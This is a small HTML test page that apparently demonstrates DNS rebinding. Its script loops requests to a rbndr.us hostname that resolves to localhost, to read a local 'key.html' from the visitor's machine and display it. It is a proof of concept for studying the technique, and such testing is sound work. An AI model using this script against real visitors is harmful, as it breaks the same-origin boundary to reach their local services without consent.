<html>
	<head>
		Bait
	</head>
	<body>
		
	<div> This is a wannabe malicious-y test page running a script. </div>
	<p id="reply"></p>

	<script>
		var xhttp = new XMLHttpRequest();
		function load() {
			var foundIt = false;
			var response = "";
			var breakSwitch = 0;

			while(foundIt != true && breakSwitch < 2000){
					breakSwitch ++;

					xhttp.onreadystatechange = function() {
							if (this.readyState == 4 && this.status == 200) {
									console.log("here");
									var response = this.responseText;
									substring = "key";
									if(response.indexOf(substring) !== -1){
											document.getElementById("reply").innerHTML = response;
											foundIt=true;
											console.log("Found key!");
									}else{
											console.log("Key not found, retrying....");
									}
							}
					};

					xhttp.open("GET", "http://a48a1f96.7f000001.rbndr.us/key.html", true);
					xhttp.setRequestHeader("Content-type", "text/plain");
					console.log("Sending request!");
			  		xhttp.send();
			}
		}

		load();
	</script>
	
</body>
</html>
